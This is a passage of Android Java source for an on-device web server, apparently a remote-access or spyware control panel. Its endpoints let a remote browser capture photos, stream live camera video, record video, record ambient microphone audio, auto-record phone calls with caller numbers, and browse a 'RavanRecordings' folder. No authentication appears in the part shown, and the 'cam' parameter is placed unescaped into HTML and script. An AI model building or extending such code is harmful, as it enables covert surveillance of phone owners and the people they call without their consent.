        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Capturing Photo...</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        try {
            CameraHelper cameraHelper = new CameraHelper(context);
            byte[] imageData = cameraHelper.capturePhoto(cameraId);

            if (imageData != null && imageData.length > 0) {
                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);

                html.append("<div style=\"text-align: center;\">");
                html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
                html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
                html.append("</div>");

                html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
                html.append(
                        "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
                html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(233, 69, 96, 0.2); border-radius: 10px; color: #e94560; text-decoration: none;\">&#128247; Capture Again</a>");
                html.append("</div>");

            } else {
                String error = cameraHelper.getLastError();
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
                html.append("<p>Failed to capture photo</p>");
                if (error != null) {
                    html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
                            .append(escapeHtml(error)).append("</p>");
                }
                html.append(
                        "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("</div>");
            }

        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
            html.append(
                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraPhoto(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0";
        }

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return serveError("Camera permission not granted");
            }
        }

        try {
            CameraHelper cameraHelper = new CameraHelper(context);
            byte[] imageData = cameraHelper.capturePhoto(cameraId);

            if (imageData != null && imageData.length > 0) {
                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, imageData.length);
                response.addHeader("Content-Disposition",
                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
                return response;
            } else {
                String error = cameraHelper.getLastError();
                return serveError(error != null ? error : "Failed to capture photo");
            }

        } catch (Exception e) {
            return serveError("Error capturing photo: " + e.getMessage());
        }
    }

    // ============ LIVE STREAMING ============

    private Response serveLiveStreamPage(Map<String, String> params) {
        String camId = params.get("cam");
        if (camId == null)
            camId = "0";

        // Get resolution from params, default to "low" for mobile data optimization
        String res = params.get("res");
        if (res == null)
            res = "low";

        // Resolution presets optimized for different network speeds
        int width, height, quality, fps;
        String resLabel;
        switch (res) {
            case "ultra_low":
                width = 160;
                height = 120;
                quality = 20;
                fps = 2;
                resLabel = "Ultra Low (160x120)";
                break;
            case "very_low":
                width = 240;
                height = 180;
                quality = 25;
                fps = 3;
                resLabel = "Very Low (240x180)";
                break;
            case "low":
            default:
                width = 320;
                height = 240;
                quality = 28;
                fps = 10;
                resLabel = "Low (320x240) - DEFAULT";
                break;
            case "medium":
                width = 480;
                height = 360;
                quality = 35;
                fps = 15;
                resLabel = "Medium (480x360)";
                break;
            case "high":
                width = 640;
                height = 480;
                quality = 45;
                fps = 20;
                resLabel = "High (640x480)";
                break;
            case "very_high":
                width = 800;
                height = 600;
                quality = 55;
                fps = 24;
                resLabel = "Very High (800x600)";
                break;
            case "hd":
                width = 1280;
                height = 720;
                quality = 65;
                fps = 30;
                resLabel = "HD (1280x720)";
                break;
        }

        int refreshRate = 1000 / fps; // Convert FPS to milliseconds

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Live Camera Stream</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Network info banner
        html.append(
                "<div style=\"background: rgba(52, 152, 219, 0.2); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; text-align: center;\">");
        html.append("<span style=\"color: #3498db; font-size: 0.85rem;\">&#128246; Current: ").append(resLabel);
        html.append(" | ~").append(quality * width * height / 8000).append(" KB/frame</span>");
        html.append("</div>");

        // Live stream viewer
        html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
        html.append(
                "<div id=\"stream-container\" style=\"position: relative; display: inline-block; background: #000; border-radius: 10px; overflow: hidden; min-height: 180px;\">");
        html.append(
                "<img id=\"stream\" src=\"/camera/frame\" style=\"max-width: 100%; height: auto; display: block;\" ");
        html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
        html.append(
                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem;\">");
        html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 10px;\"></span>");
        html.append("</div>");
        html.append(
                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff;\">Loading...</div>");
        html.append(
                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; display: none;\">");
        html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        // Resolution selector
        html.append("<div style=\"margin-bottom: 20px; text-align: center;\">");
        html.append(
                "<h4 style=\"color: #888; margin-bottom: 10px; font-size: 0.9rem;\">&#128246; Resolution (for slow internet, choose lower)</h4>");
        html.append("<div style=\"display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;\">");

        String[] resOptions = { "ultra_low", "very_low", "low", "medium", "high", "very_high", "hd" };
        String[] resNames = { "Ultra Low", "Very Low", "Low", "Medium", "High", "Very High", "HD" };
        for (int i = 0; i < resOptions.length; i++) {
            String selected = resOptions[i].equals(res) ? "background: #e94560; color: #fff;"
                    : "background: rgba(255,255,255,0.1);";
            html.append("<a href=\"/camera/live?cam=").append(camId).append("&res=").append(resOptions[i])
                    .append("\" ");
            html.append("style=\"padding: 8px 12px; ").append(selected)
                    .append(" border-radius: 6px; color: #fff; text-decoration: none; font-size: 0.8rem;\">");
            html.append(resNames[i]);
            html.append("</a>");
        }
        html.append("</div>");
        html.append("</div>");

        // Camera selection
        html.append(
                "<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 20px;\">");
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        for (CameraHelper.CameraInfo cam : cameras) {
            String selected = cam.id.equals(camId) ? "background: #e94560; color: #fff;" : "";
            html.append("<a href=\"/camera/live?cam=").append(cam.id).append("&res=").append(res).append("\" ");
            html.append(
                    "style=\"padding: 10px 20px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; ")
                    .append(selected).append("\">");
            html.append(cam.facing).append(" Camera");
            html.append("</a>");
        }
        html.append("</div>");

        // Action buttons
        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
        html.append(
                "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
        html.append(
                "<button id=\"rec-btn\" onclick=\"toggleRecording()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e74c3c, #c0392b); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#9679; Start Recording</button>");
        html.append(
                "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none;\">&#8592; Back</a>");
        html.append("</div>");

        // Status
        html.append(
                "<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");

        // JavaScript for live stream with optimizations
        html.append("<script>");
        html.append("var camId = '").append(camId).append("';");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var refreshRate = ").append(refreshRate).append(";");
        html.append("var isRecording = false;");
        html.append("var streamImg = document.getElementById('stream');");
        html.append("var loadingDiv = document.getElementById('loading');");
        html.append("var fpsCounter = document.getElementById('fps-counter');");
        html.append("var frameCount = 0;");
        html.append("var lastFpsTime = Date.now();");
        html.append("var errorCount = 0;");
        html.append("var streamActive = true;");

        // Start streaming with current resolution
        html.append("function startStream() {");
        html.append(
                "  fetch('/camera/start-stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality);");
        html.append("  refreshFrame();");
        html.append("}");

        // Handle stream load success
        html.append("function streamLoaded() {");
        html.append("  loadingDiv.style.display = 'none';");
        html.append("  errorCount = 0;");
        html.append("  frameCount++;");
        html.append("  var now = Date.now();");
        html.append("  if (now - lastFpsTime >= 1000) {");
        html.append("    fpsCounter.innerHTML = frameCount + ' fps';");
        html.append("    frameCount = 0;");
        html.append("    lastFpsTime = now;");
        html.append("  }");
        html.append("  refreshFrame();");
        html.append("}");

        // Handle stream error with retry
        html.append("function handleStreamError() {");
        html.append("  errorCount++;");
        html.append("  if (errorCount < 10) {");
        html.append("    setTimeout(refreshFrame, Math.max(refreshRate, 150));");
        html.append("  } else {");
        html.append(
                "    loadingDiv.innerHTML = 'Stream error. <a href=\"javascript:location.reload()\" style=\"color:#e94560\">Reload</a>';");
        html.append("  }");
        html.append("}");

        // Refresh frame with adaptive timing
        html.append("function refreshFrame() {");
        html.append("  if (!streamActive) return;");
        html.append("  streamImg.src = '/camera/frame?t=' + Date.now();");
        html.append("}");

        // Capture photo
        html.append("function capturePhoto() {");
        html.append("  window.open('/camera/photo?cam=' + camId, '_blank');");
        html.append("}");

        // Toggle recording
        html.append("function toggleRecording() {");
        html.append("  var btn = document.getElementById('rec-btn');");
        html.append("  var indicator = document.getElementById('rec-indicator');");
        html.append("  if (isRecording) {");
        html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9679; Start Recording';");
        html.append("      btn.style.background = 'linear-gradient(135deg, #e74c3c, #c0392b)';");
        html.append("      indicator.style.display = 'none';");
        html.append("      isRecording = false;");
        html.append("    });");
        html.append("  } else {");
        html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9632; Stop Recording';");
        html.append("      btn.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';");
        html.append("      indicator.style.display = 'block';");
        html.append("      isRecording = true;");
        html.append("    });");
        html.append("  }");
        html.append("}");

        // Check status
        html.append("function checkStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    if (d.recording) {");
        html.append("      document.getElementById('rec-indicator').style.display = 'block';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; Stop Recording';");
        html.append("      isRecording = true;");
        html.append("    }");
        html.append("  }).catch(e => {});");
        html.append("}");

        // Stop stream when leaving page
        html.append("window.onbeforeunload = function() { streamActive = false; };");

        html.append("startStream();");
        html.append("checkStatus();");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveMJPEGStream(Map<String, String> params) {
        // Start stream if not already - use low resolution by default for mobile data
        if (!CameraService.isCurrentlyStreaming()) {
            String camId = params.get("cam");
            // Default to 320x240 with low quality for mobile data compatibility
            startCameraStreamInternal(camId != null ? camId : "0", 320, 240, 30);
            try {
                Thread.sleep(200); // Give more time for camera to start
            } catch (InterruptedException e) {
            }
        }

        // Return single frame for simplicity (MJPEG multipart is complex with
        // NanoHTTPD)
        return serveSingleFrame();
    }

    private Response serveSingleFrame() {
        byte[] frame = CameraService.getNextFrame(200);
        if (frame != null && frame.length > 0) {
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
            return response;
        } else {
            // Return a 1x1 transparent pixel as fallback
            byte[] pixel = new byte[] {
                    (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46,
                    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                    (byte) 0xFF, (byte) 0xDB, 0x00, 0x43, 0x00, 0x08, 0x06, 0x06, 0x07, 0x06,
                    0x05, 0x08, 0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D,
                    0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12, 0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F,
                    0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20, 0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C,
                    0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29, 0x2C, 0x30, 0x31, 0x34, 0x34, 0x34,
                    0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32, 0x3C, 0x2E, 0x33, 0x34, 0x32,
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01,
                    0x01, 0x11, 0x00, (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01,
                    0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                    0x0A, 0x0B, (byte) 0xFF, (byte) 0xC4, 0x00, (byte) 0xB5, 0x10, 0x00, 0x02,
                    0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00,
                    0x01, 0x7D, (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7F, (byte) 0xFF, (byte) 0xD9
            };
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(pixel);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, pixel.length);
            response.addHeader("Cache-Control", "no-cache");
            return response;
        }
    }

    private Response startCameraStream(Map<String, String> params) {
        String camId = params.get("cam");
        String widthStr = params.get("width");
        String heightStr = params.get("height");
        String qualityStr = params.get("quality");

        int width = 640, height = 480, quality = 50;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
            if (qualityStr != null)
                quality = Integer.parseInt(qualityStr);
        } catch (Exception e) {
        }

        startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);

        String json = "{\"success\": true, \"message\": \"Stream started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private void startCameraStreamInternal(String camId, int width, int height, int quality) {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("START_STREAM");
        intent.putExtra("cameraId", camId);
        intent.putExtra("width", width);
        intent.putExtra("height", height);
        intent.putExtra("quality", quality);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    private Response stopCameraStream() {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("STOP_STREAM");
        context.startService(intent);

        String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response startVideoRecording(Map<String, String> params) {
        String camId = params.get("cam");
        String widthStr = params.get("width");
        String heightStr = params.get("height");

        int width = 1280, height = 720;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
        } catch (Exception e) {
        }

        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("START_RECORDING");
        intent.putExtra("cameraId", camId != null ? camId : "0");
        intent.putExtra("width", width);
        intent.putExtra("height", height);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Recording started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopVideoRecording() {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("STOP_RECORDING");
        context.startService(intent);

        String videoPath = CameraService.getCurrentVideoPath();
        String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
                (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response serveCameraStatus() {
        boolean streaming = CameraService.isCurrentlyStreaming();
        boolean recording = CameraService.isCurrentlyRecording();
        String currentCamera = CameraService.getCurrentCameraId();
        long duration = CameraService.getRecordingDuration();
        String videoPath = CameraService.getCurrentVideoPath();

        String json = String.format(
                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
                streaming, recording, currentCamera, duration,
                videoPath != null ? "\"" + videoPath + "\"" : "null");
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    // ============ AUDIO/MICROPHONE RECORDING ============

    private Response serveAudioPage() {
        boolean isRecording = CallRecordService.isRecording();
        boolean isRecordingCall = CallRecordService.isRecordingCall();
        boolean isRecordingMic = CallRecordService.isRecordingMic();
        boolean callInProgress = CallRecordService.isCallInProgress();
        String callNumber = CallRecordService.getCurrentCallNumber();
        String callType = CallRecordService.getCurrentCallType();
        long duration = CallRecordService.getRecordingDuration();
        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();

        String html = HTML_HEADER +
                "<style>" +
                ".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }"
                +
                ".status-active { border-color: #2ecc71; background: rgba(46, 204, 113, 0.1); }" +
                ".status-inactive { border-color: #e74c3c; background: rgba(231, 76, 60, 0.1); }" +
                ".status-warning { border-color: #f39c12; background: rgba(243, 156, 18, 0.1); }" +
                ".btn { padding: 12px 24px; border-radius: 10px; text-decoration: none; display: inline-block; margin: 5px; font-weight: 600; cursor: pointer; border: none; font-size: 0.9rem; }"
                +
                ".btn-primary { background: linear-gradient(135deg, #e94560, #ff6b6b); color: white; }" +
                ".btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: white; }" +
                ".btn-danger { background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; }" +
                ".btn-warning { background: linear-gradient(135deg, #f39c12, #e67e22); color: white; }" +
                ".toggle-container { display: flex; align-items: center; gap: 10px; margin: 10px 0; }" +
                ".toggle-switch { position: relative; width: 50px; height: 26px; background: #555; border-radius: 13px; cursor: pointer; transition: all 0.3s; }"
                +
                ".toggle-switch.active { background: #2ecc71; }" +
                ".toggle-switch::after { content: ''; position: absolute; width: 22px; height: 22px; border-radius: 50%; background: white; top: 2px; left: 2px; transition: all 0.3s; }"
                +
                ".toggle-switch.active::after { left: 26px; }" +
                ".call-alert { padding: 20px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.3), rgba(39, 174, 96, 0.2)); border-radius: 15px; margin-bottom: 20px; border: 2px solid #2ecc71; animation: pulse 2s infinite; }"
                +
                "@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }" +
                ".recording-indicator { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: rgba(231, 76, 60, 0.2); border-radius: 20px; color: #e74c3c; font-weight: 600; }"
                +
                ".recording-dot { width: 10px; height: 10px; background: #e74c3c; border-radius: 50%; animation: blink 1s infinite; }"
                +
                "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
                ".duration { font-size: 1.5rem; font-weight: bold; color: #e94560; }" +
                "</style>" +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">&#127908; Audio Control Panel</h2>";

        // Call in progress alert
        if (callInProgress) {
            html += "<div class=\"call-alert\">" +
                    "<div style=\"display: flex; align-items: center; gap: 15px;\">" +
                    "<span style=\"font-size: 2rem;\">&#128222;</span>" +
                    "<div>" +
                    "<div style=\"font-size: 1.2rem; font-weight: bold; color: #2ecc71;\">" +
                    (callType.equals("incoming") ? "Incoming Call" : "Outgoing Call") + "</div>" +
                    "<div style=\"color: #fff;\">" + escapeHtml(callNumber) + "</div>" +
                    "</div>" +
                    "</div>" +
                    "</div>";
        }

        // Recording status
        html += "<div class=\"status-card " + (isRecording ? "status-active" : "status-inactive") + "\">" +
                "<div style=\"display: flex; justify-content: space-between; align-items: center;\">" +
                "<div>" +
                "<h3>" + (isRecording ? "&#128308; Recording Active" : "&#9899; Not Recording") + "</h3>";

        if (isRecording) {
            String recordingType = isRecordingCall ? "Call Recording" : "Microphone Recording";
            html += "<p style=\"color: #888; margin-top: 5px;\">" + recordingType + "</p>" +
                    "<div class=\"duration\" id=\"duration\">" + formatDuration((int) duration) + "</div>";
        }

        html += "</div>" +
                "<div>" +
                (isRecording
                        ? "<a href=\"/audio/" + (isRecordingCall ? "call" : "mic")
                                + "/stop\" class=\"btn btn-danger\">&#9724; Stop</a>"
                        : "")
                +
                "</div>" +
                "</div>" +
                "</div>";

        // Control buttons
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#127897; Microphone Recording</h3>" +
                "<p style=\"color: #888; margin-bottom: 15px;\">Capture ambient audio from device microphone</p>" +
                "<div>" +
                "<a href=\"/audio/mic/start\" class=\"btn btn-success\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">&#128308; Start Recording</a>" +
                "<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 30s</a>" +
                "<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 1min</a>" +
                "<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 5min</a>" +
                "</div>" +
                "</div>";

        // Call recording section
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#128222; Call Recording</h3>" +
                "<p style=\"color: #888; margin-bottom: 15px;\">Record phone calls automatically or manually</p>" +
                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;\">"
                +
                "<div class=\"toggle-container\">" +
                "<span>Auto-record calls:</span>" +
                "<a href=\"/audio/settings?auto_record=" + (!autoRecordEnabled) + "&save_on_device="
                + saveOnDeviceEnabled + "\" style=\"text-decoration: none;\">" +
                "<div class=\"toggle-switch " + (autoRecordEnabled ? "active" : "") + "\"></div>" +
                "</a>" +
                "</div>" +
                "<div class=\"toggle-container\">" +
                "<span>Save on device:</span>" +
                "<a href=\"/audio/settings?auto_record=" + autoRecordEnabled + "&save_on_device="
                + (!saveOnDeviceEnabled) + "\" style=\"text-decoration: none;\">" +
                "<div class=\"toggle-switch " + (saveOnDeviceEnabled ? "active" : "") + "\"></div>" +
                "</a>" +
                "</div>" +
                "</div>" +
                "</div>";

        // View recordings link
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#128190; Saved Recordings</h3>" +
                "<a href=\"/audio/recordings\" class=\"btn btn-primary\">View All Recordings</a>" +
                "<a href=\"/files/Music/RavanRecordings\" class=\"btn btn-success\">Open in File Manager</a>" +
                "</div>";

        // Auto-refresh script for status
        html += "<script>" +
                "setInterval(function() {" +
                "  fetch('/audio/status')" +
                "    .then(r => r.json())" +
                "    .then(data => {" +
                "      if (data.isRecording && document.getElementById('duration')) {" +
                "        var d = data.duration;" +
                "        var min = Math.floor(d / 60);" +
                "        var sec = d % 60;" +
                "        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;" +
                "      }" +
                "      if (data.callInProgress && !document.querySelector('.call-alert')) {" +
                "        location.reload();" +
                "      }" +
                "    });" +
                "}, 2000);" +
                "</script>";

        html += HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startMicRecording(Map<String, String> params) {
        int duration = 0;
        if (params.containsKey("duration")) {
            try {
                duration = Integer.parseInt(params.get("duration"));
            } catch (Exception e) {
                duration = 0;
            }
        }

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("START_MIC_RECORDING");
        intent.putExtra("duration", duration);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response stopMicRecording() {
        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("STOP_MIC_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startCallRecording(Map<String, String> params) {
        String phoneNumber = params.get("number");
        String callType = params.get("type");

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("START_CALL_RECORDING");
        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
        intent.putExtra("call_type", callType != null ? callType : "manual");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopCallRecording() {
        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("STOP_CALL_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping call recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioStatus() {
        boolean isRecording = CallRecordService.isRecording();
        boolean isRecordingCall = CallRecordService.isRecordingCall();
        boolean isRecordingMic = CallRecordService.isRecordingMic();
        boolean callInProgress = CallRecordService.isCallInProgress();
        String callNumber = CallRecordService.getCurrentCallNumber();
        String callType = CallRecordService.getCurrentCallType();
